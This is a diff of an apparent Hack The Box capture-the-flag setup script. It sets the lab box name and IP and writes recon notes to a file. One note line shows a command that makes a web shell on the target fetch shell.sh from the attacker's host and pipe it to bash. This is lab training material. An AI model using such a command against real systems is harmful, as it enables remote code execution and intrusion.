@@ -3,12 +3,12 @@
 # set box name, IP and ostype
 #for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done
 
-BOXNAME=Armageddon2r
-LAST=
+BOXNAME=Corporate
+LAST=246
 OS=lin
 USER=bob
 
-export IP=10.10.55.249 #10.10.11.$LAST
+export IP=10.10.11.$LAST
 export HOME=/home/$USER/hackthebox/$BOXNAME          #enter box Name
 export SELF=$(hostname -I | awk '{print $6}')
 
@@ -75,7 +75,7 @@ echo '#gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/D
 echo '#gobuster dns domain.com -o buster/dom.log' >> $HOME/notes
 echo "don\'t do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do: " >> $HOME/notes
 echo "curl http://$IP/cmd.php --data-urlencode \'cmd=curl http://$SELF/shell.sh|bash\'" >> $HOME/notes
-echo "svn export https://github.com/repo.git/trunk/<folder to download>"  >> "$HOME/notes
+echo "svn export https://github.com/repo.git/trunk/<folder to download>"  >> $HOME/notes
 # Try nikto
 echo "" >> $HOME/notes
 echo "# nikto" >> $HOME/notes
